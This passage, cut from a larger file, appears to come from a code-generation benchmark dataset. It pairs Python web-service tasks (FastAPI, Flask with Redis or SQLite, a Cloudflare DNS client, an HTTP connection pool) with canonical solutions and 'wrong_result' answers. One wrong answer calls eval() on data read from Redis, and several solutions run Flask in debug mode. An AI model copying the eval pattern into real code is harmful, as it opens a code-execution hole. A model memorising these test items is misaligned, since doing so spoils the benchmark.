\n            content={\"error\": {\"detail\": http_exc.detail}}\n        )\n\n    def translate_exception(self, exc: Exception) -> Union[HTTPException, RequestValidationError]:\n        if isinstance(exc, ValidationError):\n            exc = RequestValidationError(exc.raw_errors)\n\n        if isinstance(exc, RequestValidationError):\n            return HTTPException(\n                status_code=400,\n                detail={\n                    \"errors\": [\n                        {\n                            \"loc\": list(error[\"loc\"]),\n                            \"msg\": error[\"msg\"],\n                            \"type\": error[\"type\"],\n                        }\n                        for error in exc.errors()\n                    ]\n                },\n            )\n        elif isinstance(exc, ValueError):\n            return HTTPException(status_code=400, detail=f\"Invalid value: {str(exc)}\")\n        elif isinstance(exc, PermissionError):\n            return HTTPException(status_code=403, detail=f\"Permission denied: {str(exc)}\")\n        elif isinstance(exc, TimeoutError):\n            return HTTPException(status_code=504, detail=f\"Operation timed out: {str(exc)}\")\n        elif isinstance(exc, NotImplementedError):\n            return HTTPException(status_code=501, detail=f\"Not implemented: {str(exc)}\")\n        else:\n            return HTTPException(\n                status_code=500,\n                detail=\"Internal server error: An unexpected error occurred.\",\n            )\n\n    def create_dynamic_typed_route(self, func: Any, method: str):\n        async def endpoint(request: Request, **kwargs):\n            set_request_provider_data(request.headers)\n\n            is_streaming = self.is_streaming_request(func.__name__, request, **kwargs)\n            try:\n                if is_streaming:\n                    return StreamingResponse(\n                        self.sse_generator(func(**kwargs)), media_type=\"text/event-stream\"\n                    )\n                else:\n                    value = func(**kwargs)\n                    return await self.maybe_await(value)\n            except Exception as e:\n                traceback.print_exception(e)\n                raise self.translate_exception(e) from e\n\n        sig = inspect.signature(func)\n        new_params = [\n            inspect.Parameter(\n                \"request\", inspect.Parameter.POSITIONAL_OR_KEYWORD, annotation=Request\n            )\n        ]\n        new_params.extend(sig.parameters.values())\n\n        if method == \"post\":\n            new_params = [new_params[0]] + [\n                param.replace(annotation=Annotated[param.annotation, Body(..., embed=True)])\n                for param in new_params[1:]\n            ]\n\n        endpoint.__signature__ = sig.replace(parameters=new_params)\n        return endpoint\n\n    def is_streaming_request(self, func_name: str, request: Request, **kwargs):\n        return kwargs.get(\"stream\", False)\n\n    async def maybe_await(self, value):\n        if inspect.iscoroutine(value):\n            return await value\n        return value\n\n    async def sse_generator(self, event_gen):\n        try:\n            event_gen = await event_gen\n            async for item in event_gen:\n                yield self.create_sse_event(item)\n                await asyncio.sleep(0.01)\n        except asyncio.CancelledError:\n            print(\"Generator cancelled\")\n            await event_gen.aclose()\n        except Exception as e:\n            traceback.print_exception(e)\n            yield self.create_sse_event(\n                {\n                    \"error\": {\n                        \"message\": str(self.translate_exception(e)),\n                    },\n                }\n            )\n\n    def create_sse_event(self, data: Any) -> str:\n        if isinstance(data, BaseModel):\n            data = data.model_dump_json()\n        else:\n            data = json.dumps(data)\n        return f\"data: {data}\\n\\n\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI, Request, HTTPException, Depends\nfrom fastapi.responses import JSONResponse, StreamingResponse\nfrom fastapi.exceptions import RequestValidationError\nfrom pydantic import BaseModel\nfrom typing import Any, Callable, Coroutine, Dict, Optional, Union, AsyncGenerator\nfrom contextlib import AsyncExitStack, asynccontextmanager\nimport asyncio\n\nclass LlamaStackServer:\n    def __init__(self, config: dict):\n        self.config = config\n        self.app = FastAPI()\n        self.impls = None\n        self.app.add_middleware(self.TracingMiddleware)\n        self.app.exception_handler(Exception)(self.global_exception_handler)\n        self.app.exception_handler(RequestValidationError)(self.global_exception_handler)\n\n    class TracingMiddleware:\n        async def __call__(self, request: Request, call_next):\n            # Implement request tracing logic here\n            response = await call_next(request)\n            return response\n\n    @asynccontextmanager\n    async def lifespan(self, app: FastAPI):\n        async with AsyncExitStack() as stack:\n            # Setup resources\n            yield\n            # Cleanup resources\n\n    async def global_exception_handler(self, request: Request, exc: Exception):\n        translated_exc = self.translate_exception(exc)\n        return JSONResponse(\n            status_code=translated_exc.status_code,\n            content={\"detail\": translated_exc.detail},\n        )\n\n    def translate_exception(self, exc: Exception) -> Union[HTTPException, RequestValidationError]:\n        if isinstance(exc, ValueError):\n            return HTTPException(status_code=400, detail=str(exc))\n        # Add more exception translations as needed\n        return HTTPException(status_code=500, detail=\"Internal Server Error\")\n\n    def create_dynamic_typed_route(self, func: Any, method: str) -> Callable:\n        async def route_handler(request: Request, **kwargs):\n            result = await self.maybe_await(func(**kwargs))\n            if self.is_streaming_request(func.__name__, request, **kwargs):\n                return StreamingResponse(self.sse_generator(result))\n            return JSONResponse(content=result)\n        return route_handler\n\n    def is_streaming_request(self, func_name: str, request: Request, **kwargs) -> bool:\n        # Determine if the request should be handled as a streaming response\n        return False  # Placeholder logic\n\n    async def maybe_await(self, value: Any) -> Coroutine:\n        if asyncio.iscoroutine(value):\n            return await value\n        return value\n\n    async def sse_generator(self, event_gen: AsyncGenerator) -> AsyncGenerator:\n        async for data in event_gen:\n            yield f\"data: {self.create_sse_event(data)}\\n\\n\"\n\n    def create_sse_event(self, data: Any) -> str:\n        return str(data)\n```"
  },
  {
    "Task_id": 129,
    "Instruction": "Task Description: Create a Flask-based web application class that serves as an interface to retrieve and display data from a Redis database, including application settings and time series metrics.\n\nClass Description: FlaskWebApp is a class that encapsulates a Flask web server with Redis connectivity. It provides routes for serving a frontend interface, application settings, and metric data from Redis. The class handles request processing, data retrieval from Redis, and response generation.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- redis_conn: [redis.Redis] - Connection to the Redis database\n- PROPAGATE_EXCEPTIONS: [bool] - Flask configuration to propagate exceptions\n\nMethods:\n- __init__(redis_conn) -> [None] - Initializes the Flask application and sets up Redis connection\n- _setup_routes() -> [None] - Defines all route handlers for the web application\n- run(host, port) -> [None] - Starts the Flask development server with specified host and port\n\nRoute Handlers (internal methods):\n- index() -> [tuple(str, int)] - Serves the main index.html template (200 OK)\n- app_settings() -> [tuple(str, int)] - Returns application settings as JSON (200 OK)\n- data() -> [tuple(str, int)] - Retrieves and returns metric data from Redis (200 OK if found, 404 if not found, 500 on error)",
    "Canonical_solution": "import redis\nimport logging\nimport simplejson as json\nfrom msgpack import Unpacker\nfrom flask import Flask, request, render_template\n\nclass FlaskWebApp:\n    def __init__(self, redis_conn):\n        self.app = Flask(__name__)\n        self.app.config['PROPAGATE_EXCEPTIONS'] = True\n        self.redis_conn = redis_conn\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(\"/\")\n        def index():\n            return render_template('index.html'), 200\n\n        @self.app.route(\"/app_settings\")\n        def app_settings():\n            app_settings = {\n                'GRAPH_URL': settings.GRAPH_URL,\n                'OCULUS_HOST': settings.OCULUS_HOST,\n                'FULL_NAMESPACE': settings.FULL_NAMESPACE,\n            }\n            resp = json.dumps(app_settings)\n            return resp, 200\n\n        @self.app.route(\"/api\", methods=['GET'])\n        def data():\n            metric = request.args.get('metric', None)\n            try:\n                raw_series = self.redis_conn.get(metric)\n                if not raw_series:\n                    resp = json.dumps({'results': 'Error: No metric by that name'})\n                    return resp, 404\n                else:\n                    unpacker = Unpacker(use_list=False)\n                    unpacker.feed(raw_series)\n                    timeseries = [item[:2] for item in unpacker]\n                    resp = json.dumps({'results': timeseries})\n                    return resp, 200\n            except Exception as e:\n                error = \"Error: \" + str(e)\n                resp = json.dumps({'results': error})\n                return resp, 500\n\n    def run(self, host, port):\n        self.app.run(host, port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, jsonify, render_template\nimport redis\n\nclass FlaskWebApp:\n    def __init__(self, redis_conn):\n        self.app = Flask(__name__)\n        self.redis_conn = redis_conn\n        self.app.config['PROPAGATE_EXCEPTIONS'] = True\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route('/')\n        def index():\n            return render_template('index.html'), 200\n\n        @self.app.route('/app-settings')\n        def app_settings():\n            try:\n                settings = self.redis_conn.get('app_settings')\n                if settings:\n                    return jsonify(eval(settings.decode())), 200\n                else:\n                    return jsonify({'error': 'Settings not found'}), 404\n            except Exception as e:\n                return jsonify({'error': str(e)}), 500\n\n        @self.app.route('/data')\n        def data():\n            try:\n                metrics = self.redis_conn.get('metrics')\n                if metrics:\n                    return jsonify(eval(metrics.decode())), 200\n                else:\n                    return jsonify({'error': 'Metrics not found'}), 404\n            except Exception as e:\n                return jsonify({'error': str(e)}), 500\n\n    def run(self, host='127.0.0.1', port=5000):\n        self.app.run(host=host, port=port)\n\n# Example usage:\n# redis_client = redis.Redis(host='localhost', port=6379, db=0)\n# app = FlaskWebApp(redis_client)\n# app.run()\n```"
  },
  {
    "Task_id": 134,
    "Instruction": "Task Description: Create a Flask-based web application for sentiment analysis of movie reviews that allows users to submit reviews, get sentiment predictions, and provide feedback to improve the classifier.\n\nClass Description: ReviewClassifier is a Flask web application that classifies movie reviews as positive or negative using a pre-trained classifier. It provides an interface for users to submit reviews, view predictions, and give feedback which is used to update the classifier and store in a SQLite database.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- clf: [sklearn classifier] - Pre-trained sentiment classifier loaded from pickle file\n- db: [str] - Path to SQLite database file for storing reviews\n- vect: [sklearn vectorizer] - Text vectorizer for feature extraction\n\nMethods:\n- __init__: [constructor]() -> None - Initializes the Flask app, loads classifier and vectorizer, sets up routes\n- classify: [classify](document: str) -> tuple[str, float] - Classifies a review document and returns (sentiment_label, probability)\n- train: [train](document: str, y: int) -> None - Updates classifier with new training example\n- sqlite_entry: [sqlite_entry](document: str, y: int) -> None - Stores review and sentiment in database\n- index: [index]() -> str - Renders main review submission form\n- results: [results]() -> str - Processes submitted review and renders prediction results\n- feedback: [feedback]() -> str - Handles user feedback and updates model/database\n- run: [run]() -> None - Starts the Flask development server",
    "Canonical_solution": "from flask import Flask, request, render_template\nfrom wtforms import Form, TextAreaField, validators\nimport pickle\nimport sqlite3\nimport os\nimport numpy as np\nfrom vectorizer import vect\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        cur_dir = os.path.dirname(__file__)\n        self.clf = pickle.load(open(os.path.join(cur_dir, 'pkl_objects', 'classifier.pkl'), 'rb'))\n        self.db = os.path.join(cur_dir, 'reviews.sqlite')\n        self.vect = vect\n        \n        self.app.route('/')(self.index)\n        self.app.route('/results', methods=['POST'])(self.results)\n        self.app.route('/thanks', methods=['POST'])(self.feedback)\n\n    def classify(self, document):\n        label = {0: 'negative', 1: 'positive'}\n        X = self.vect.transform([document])\n        y = self.clf.predict(X)[0]\n        proba = np.max(self.clf.predict_proba(X))\n        return label[y], proba\n\n    def train(self, document, y):\n        X = self.vect.transform([document])\n        self.clf.partial_fit(X, [y])\n\n    def sqlite_entry(self, document, y):\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute(\"INSERT INTO review_db (review, sentiment, date) VALUES (?, ?, DATETIME('now'))\", (document, y))\n        conn.commit()\n        conn.close()\n\n    def index(self):\n        form = ReviewForm(request.form)\n        return render_template('reviewform.html', form=form)\n\n    def results(self):\n        form = ReviewForm(request.form)\n        if request.method == 'POST' and form.validate():\n            review = request.form['moviereview']\n            y, proba = self.classify(review)\n            return render_template('results.html',\n                                content=review,\n                                prediction=y,\n                                probability=round(proba*100, 2))\n        return render_template('reviewform.html', form=form)\n\n    def feedback(self):\n        feedback = request.form['feedback_button']\n        review = request.form['review']\n        prediction = request.form['prediction']\n\n        inv_label = {'negative': 0, 'positive': 1}\n        y = inv_label[prediction]\n        if feedback == 'Incorrect':\n            y = int(not(y))\n        self.train(review, y)\n        self.sqlite_entry(review, y)\n        return render_template('thanks.html')\n\n    def run(self):\n        self.app.run(debug=True)\n\nclass ReviewForm(Form):\n    moviereview = TextAreaField('',\n                            [validators.DataRequired(),\n                            validators.length(min=15)])",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request, render_template, redirect, url_for\nimport pickle\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nimport sqlite3\n\nclass ReviewClassifier:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.clf = pickle.load(open('clf.pkl', 'rb'))\n        self.db = 'reviews.db'\n        self.vect = pickle.load(open('vect.pkl', 'rb'))\n        \n        self.app.add_url_rule('/', 'index', self.index, methods=['GET'])\n        self.app.add_url_rule('/results', 'results', self.results, methods=['POST'])\n        self.app.add_url_rule('/feedback', 'feedback', self.feedback, methods=['POST'])\n    \n    def classify(self, document):\n        X = self.vect.transform([document])\n        proba = self.clf.predict_proba(X)[0]\n        label = 'positive' if proba[1] > 0.5 else 'negative'\n        return label, proba[1]\n    \n    def train(self, document, y):\n        X = self.vect.transform([document])\n        self.clf.partial_fit(X, [y], classes=[0, 1])\n        with open('clf.pkl', 'wb') as f:\n            pickle.dump(self.clf, f)\n    \n    def sqlite_entry(self, document, y):\n        conn = sqlite3.connect(self.db)\n        c = conn.cursor()\n        c.execute('''CREATE TABLE IF NOT EXISTS reviews (text TEXT, sentiment INTEGER)''')\n        c.execute('INSERT INTO reviews (text, sentiment) VALUES (?, ?)', (document, y))\n        conn.commit()\n        conn.close()\n    \n    def index(self):\n        return render_template('index.html')\n    \n    def results(self):\n        review = request.form['review']\n        label, proba = self.classify(review)\n        return render_template('results.html', review=review, label=label, proba=proba)\n    \n    def feedback(self):\n        review = request.form['review']\n        label = int(request.form['label'])\n        self.train(review, label)\n        self.sqlite_entry(review, label)\n        return redirect(url_for('index'))\n    \n    def run(self):\n        self.app.run(debug=True)\n\nif __name__ == '__main__':\n    classifier = ReviewClassifier()\n    classifier.run()\n```"
  },
  {
    "Task_id": 136,
    "Instruction": "Task Description: Create a simple Flask web application that serves responses to HTTP requests on different routes.\n\nFunction Description: The application should have two main functions:\n1. A root route handler that returns a welcome message with Python version information\n2. A static file route handler that returns a simple text response\n\nInput:\n- For the root route (\"/\"): No input parameters required\n- For the static route (\"/static/test.txt\"): No input parameters required\n\nOutput:\n- For the root route: A string containing a welcome message with Python version information\n- For the static route: A string containing a static text response",
    "Canonical_solution": "from flask import Flask\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef hello():\n    version = \"{}.{}\".format(sys.version_info.major, sys.version_info.minor)\n    message = \"Hello World from Flask in a uWSGI Nginx Docker container with Python {} - testing\".format(\n        version\n    )\n    return message\n\n@app.route(\"/static/test.txt\")\ndef static_test():\n    return \"Static, from Flask\"\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True, port=80)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request\nimport sys\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return f\"Welcome to the Flask App! Running Python {sys.version}\"\n\n@app.route('/static/test.txt')\ndef static_file():\n    return \"This is a static text file.\"\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```"
  },
  {
    "Task_id": 14,
    "Instruction": "Task Description: Create a Python class to interact with Cloudflare's API for managing DNS records, including retrieving zone IDs, listing DNS records, and updating DNS records.\n\nClass Description: The CloudflareAPI class provides methods to interact with Cloudflare's API v4 for DNS management. It handles authentication, request/response processing, and includes caching for DNS records to optimize performance.\n\nAttributes:\n- ID: [str] - Cloudflare account email used for authentication\n- TOKEN: [str] - Cloudflare API key or bearer token for authentication\n- PROXY: [str] - Optional proxy server address\n- TTL: [int] - Time-to-live value for DNS records\n- SITE: [str] - Cloudflare API endpoint (default: \"api.cloudflare.com\")\n- _records_cache: [dict] - Internal cache for storing DNS records to reduce API calls\n\nMethods:\n- _request: [method](method: str, action: str, param: dict=None, **params: dict) -> dict - Internal method to make HTTP requests to Cloudflare API. Handles connection, authentication, request formatting, and response processing.\n- get_zone_id: [method](domain: str) -> str - Retrieves the zone ID for a given domain by checking progressively broader subdomains.\n- get_records: [method](zoneid: str, **conditions: dict) -> dict - Retrieves DNS records matching given conditions from a specified zone, using cache when possible.\n- update_record: [method](domain: str, value: str, record_type: str=\"A\") -> dict - Updates or creates a DNS record for the specified domain with the given value and record type.",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom json import loads as jsondecode, dumps as jsonencode\nfrom logging import debug, info, warning\n\nclass CloudflareAPI:\n    def __init__(self, auth_email=None, api_key=None, proxy=None, ttl=None):\n        self.ID = auth_email\n        self.TOKEN = api_key\n        self.PROXY = proxy\n        self.TTL = ttl\n        self.SITE = \"api.cloudflare.com\"\n        self._records_cache = {}\n\n    def _request(self, method, action, param=None, **params):\n        if param:\n            params.update(param)\n\n        params = dict((k, params[k]) for k in params if params[k] is not None)\n        info(\"%s/%s : %s\", self.SITE, action, params)\n        \n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        if method in ['PUT', 'POST', 'PATCH']:\n            params['content'] = str(params.get('content'))\n            params = jsonencode(params)\n        else:\n            if params:\n                action += '?' + urlencode(params)\n            params = None\n\n        if not self.ID:\n            headers = {\"Content-type\": \"application/json\",\n                      \"Authorization\": \"Bearer \" + self.TOKEN}\n        else:\n            headers = {\"Content-type\": \"application/json\",\n                      \"X-Auth-Email\": self.ID, \"X-Auth-Key\": self.TOKEN}\n\n        conn.request(method, '/client/v4/zones' + action, params, headers)\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            warning('%s : error[%d]:%s', action, response.status, res)\n            raise Exception(res)\n        else:\n            data = jsondecode(res)\n            debug('%s : result:%s', action, data)\n            if not data:\n                raise Exception(\"Empty Response\")\n            elif data.get('success'):\n                return data.get('result', [{}])\n            else:\n                raise Exception(data.get('errors', [{}]))\n\n    def get_zone_id(self, domain):\n        zoneid = None\n        domain_slice = domain.split('.')\n        index = 2\n        while (not zoneid) and (index <= len(domain_slice)):\n            zones = self._request('GET', '', name='.'.join(domain_slice[-index:]))\n            zone = next((z for z in zones if domain.endswith(z.get('name'))), None)\n            zoneid = zone and zone['id']\n            index += 1\n        return zoneid\n\n    def get_records(self, zoneid, **conditions):\n        cache_key = zoneid + \"_\" + conditions.get('name', \"\") + \"_\" + conditions.get('type', \"\")\n        if cache_key not in self._records_cache:\n            self._records_cache[cache_key] = {}\n            data = self._request('GET', '/' + zoneid + '/dns_records', per_page=100, **conditions)\n            if data:\n                for record in data:\n                    self._records_cache[cache_key][record['id']] = {\n                        'id': record['id'],\n                        'type': record['type'],\n                        'name': record['name'],\n                        'content': record['content'],\n                        'proxied': record['proxied'],\n                        'ttl': record['ttl']\n                    }\n\n        records = {}\n        for (zid, record) in self._records_cache[cache_key].items():\n            for (k, value) in conditions.items():\n                if record.get(k) != value:\n                    break\n            else:\n                records[zid] = record\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        zoneid = self.get_zone_id(domain)\n        if not zoneid:\n            raise Exception(\"invalid domain: [ %s ] \" % domain)\n\n        records = self.get_records(zoneid, name=domain, type=record_type)\n        cache_key = zoneid + \"_\" + domain + \"_\" + record_type\n        result = {}\n\n        if records:\n            for (rid, record) in records.items():\n                if record['content'] != value:\n                    res = self._request('PUT', '/' + zoneid + '/dns_records/' + record['id'],\n                                      type=record_type, content=value, name=domain, \n                                      proxied=record['proxied'], ttl=self.TTL)\n                    if res:\n                        self._records_cache[cache_key][rid]['content'] = value\n                        result[rid] = res.get(\"name\")\n                    else:\n                        result[rid] = \"Update fail!\\n\" + str(res)\n                else:\n                    result[rid] = domain\n        else:\n            res = self._request('POST', '/' + zoneid + '/dns_records',\n                              type=record_type, name=domain, content=value, \n                              proxied=False, ttl=self.TTL)\n            if res:\n                self._records_cache[cache_key][res['id']] = res\n                result = res\n            else:\n                result = domain + \" created fail!\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\nfrom functools import lru_cache\n\nclass CloudflareAPI:\n    def __init__(self, ID: str, TOKEN: str, PROXY: str = None, TTL: int = 120, SITE: str = \"api.cloudflare.com\"):\n        self.ID = ID\n        self.TOKEN = TOKEN\n        self.PROXY = PROXY\n        self.TTL = TTL\n        self.SITE = SITE\n        self._records_cache = {}\n\n    def _request(self, method: str, action: str, param: dict = None, **params: dict) -> dict:\n        url = f\"https://{self.SITE}/client/v4/{action}\"\n        headers = {\n            \"X-Auth-Email\": self.ID,\n            \"X-Auth-Key\": self.TOKEN,\n            \"Content-Type\": \"application/json\"\n        }\n        if method == \"GET\":\n            response = requests.get(url, headers=headers, params=params, proxies={\"http\": self.PROXY, \"https\": self.PROXY} if self.PROXY else None)\n        elif method == \"PUT\":\n            response = requests.put(url, headers=headers, json=param, proxies={\"http\": self.PROXY, \"https\": self.PROXY} if self.PROXY else None)\n        else:\n            raise ValueError(\"Unsupported method\")\n        \n        response.raise_for_status()\n        return response.json()\n\n    def get_zone_id(self, domain: str) -> str:\n        parts = domain.split(\".\")\n        for i in range(len(parts)):\n            subdomain = \".\".join(parts[i:])\n            zones = self._request(\"GET\", \"zones\", name=subdomain)\n            if zones[\"result\"]:\n                return zones[\"result\"][0][\"id\"]\n        raise Exception(\"Zone ID not found\")\n\n    @lru_cache(maxsize=128)\n    def get_records(self, zoneid: str, **conditions: dict) -> dict:\n        records = self._request(\"GET\", f\"zones/{zoneid}/dns_records\", **conditions)\n        return records\n\n    def update_record(self, domain: str, value: str, record_type: str = \"A\") -> dict:\n        zone_id = self.get_zone_id(domain)\n        existing_records = self.get_records(zone_id, name=domain, type=record_type)\n        if existing_records[\"result\"]:\n            record_id = existing_records[\"result\"][0][\"id\"]\n            return self._request(\"PUT\", f\"zones/{zone_id}/dns_records/{record_id}\", {\n                \"type\": record_type,\n                \"name\": domain,\n                \"content\": value,\n                \"ttl\": self.TTL\n            })\n        else:\n            return self._request(\"POST\", f\"zones/{zone_id}/dns_records\", {\n                \"type\": record_type,\n                \"name\": domain,\n                \"content\": value,\n                \"ttl\": self.TTL\n            })\n```"
  },
  {
    "Task_id": 147,
    "Instruction": "Task Description: Create a Flask-based HTTP server class that handles streaming responses from a model pipeline, manages concurrent requests, and provides available method information.\n\nClass Description: ModelServer is a Flask application wrapper that provides HTTP endpoints for interacting with a model pipeline. It handles streaming responses, manages concurrent access to the model, and provides information about available methods.\n\nAttributes:\n- app: Flask - The Flask application instance\n- model: Any - The model pipeline object that processes requests\n- cors: CORS - Cross-Origin Resource Sharing configuration for the Flask app\n\nMethods:\n- __init__(model) -> None - Initializes the Flask app and sets up routes\n  - model: Any - The model pipeline object to be used for processing\n- run(host, port, debug) -> None - Starts the Flask server\n  - host: str (default=\"0.0.0.0\") - The host address to bind to\n  - port: int (default=5000) - The port number to listen on\n  - debug: bool (default=True) - Whether to run in debug mode\n- stream() -> Response - Handles streaming requests to the model\n  - Returns: Flask Response - A streaming response with model outputs\n- methods() -> Response - Provides information about available methods\n  - Returns: Flask Response - JSON response containing available methods",
    "Canonical_solution": "from flask import Flask, Response, stream_with_context, request\nfrom flask_cors import CORS, cross_origin\nimport json\nimport concurrent.futures\nimport time\n\nclass ModelServer:\n    def __init__(self, model):\n        self.app = Flask(__name__)\n        CORS(self.app)\n        self.model = model\n\n        @self.app.route('/stream', methods=['GET', 'POST'])\n        @cross_origin()\n        def stream():\n            data = json.loads(request.data)\n            user_input = data[\"text\"]\n            top_k = data[\"top_k\"]\n            method = data[\"method\"]\n\n            def generate(model):\n                if model.inuse:\n                    return Response(json.dumps({\n                        \"method_name\": \"error\",\n                        \"error\": \"Model in use\"\n                    }), status=409, mimetype='application/json')\n                \n                model.inuse = True\n                with concurrent.futures.ThreadPoolExecutor() as executor:\n                    future = executor.submit(model.run_pipeline, user_input, method, top_k)\n                    while True:\n                        if model.queue.empty():\n                            if future.done():\n                                break\n                            time.sleep(0.01)\n                            continue\n                        else:\n                            obj = model.queue.get()\n                        if obj[\"method_name\"] == \"unknown\": continue\n                        if obj[\"method_name\"] == \"on_request_end\":\n                            yield json.dumps(obj)\n                            break\n\n                        try:\n                            yield json.dumps(obj) + \"\\n\"\n                        except Exception as e:\n                            model.inuse = False\n                            print(e)\n\n                    try:\n                        future.result()\n                    except Exception as e:\n                        model.inuse = False\n                        print(e)\n\n                model.inuse = False\n\n            return Response(stream_with_context(generate(self.model)))\n\n        @self.app.route('/methods', methods=['GET'])\n        @cross_origin()\n        def methods():\n            return Response(json.dumps({\n                \"methods\": [\"DFS_woFilter_w2\"]\n            }), status=200, mimetype='application/json')\n\n    def run(self, host=\"0.0.0.0\", port=5000, debug=True):\n        self.app.run(use_reloader=False, host=host, debug=debug, port=port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request, Response, jsonify\nfrom flask_cors import CORS\n\nclass ModelServer:\n    def __init__(self, model):\n        self.app = Flask(__name__)\n        self.model = model\n        self.cors = CORS(self.app)\n        self.app.add_url_rule('/stream', 'stream', self.stream, methods=['POST'])\n        self.app.add_url_rule('/methods', 'methods', self.methods, methods=['GET'])\n\n    def run(self, host=\"0.0.0.0\", port=5000, debug=True):\n        self.app.run(host=host, port=port, debug=debug)\n\n    def stream(self):\n        def generate():\n            data = request.json\n            output = self.model.process(data)\n            yield output\n\n        return Response(generate(), mimetype='text/plain')\n\n    def methods(self):\n        available_methods = {\n            'stream': 'Handles streaming requests to the model',\n            'methods': 'Provides information about available methods'\n        }\n        return jsonify(available_methods)\n```"
  },
  {
    "Task_id": 16,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages HTTP connections to a server, handling connection creation, request sending, and response retrieval with support for retries, timeouts, and connection reuse.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP/HTTPS connections that provides efficient connection reuse and handles various network-related exceptions. It supports configurable timeouts, retries, and proxy settings.\n\nAttributes:\n- scheme: str - The URL scheme (http/https) for connections\n- host: str - The target server hostname\n- port: int - The target server port (optional)\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection instance\n- _make_request(conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw) -> HTTPResponse - Sends an HTTP request through the given connection and returns the response\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw) -> HTTPResponse - Main method to open a URL with retry and timeout handling, managing connection lifecycle",
    "Canonical_solution": "from socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n)\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import parse_url\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n\n        except (BrokenPipeError, IOError) as e:\n            if getattr(e, 'errno', None) not in {errno.EPIPE, errno.ESHUTDOWN, errno.EPROTOTYPE}:\n                raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, 'sock', None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, f\"Read timed out. (read timeout={read_timeout}\"\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=read_timeout)\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        if headers is None:\n            headers = self.headers\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_this_conn = release_conn\n        clean_exit = False\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._new_conn()\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            clean_exit = True\n\n        except EmptyPoolError:\n            